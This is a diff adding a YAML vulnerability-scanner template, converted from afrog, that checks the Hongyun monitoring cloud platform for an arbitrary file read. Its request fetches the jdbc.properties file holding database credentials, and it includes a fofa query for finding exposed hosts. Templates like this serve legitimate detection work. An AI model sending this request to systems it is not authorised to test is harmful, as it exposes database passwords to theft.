@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '[DATABASE]'
+          - username
+          - password
+        case-insensitive: true
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/08gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties'
+id: hongyun-mobileaction-filedownload.yaml
+info:
+  author: zan8in
+  description: 'fofa: body="./open/webApi.html"'
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 鸿运主动安全监控云平台存在任意文件读取漏洞
+  severity: high
+  tags: hongyun,filedownload,argus-import
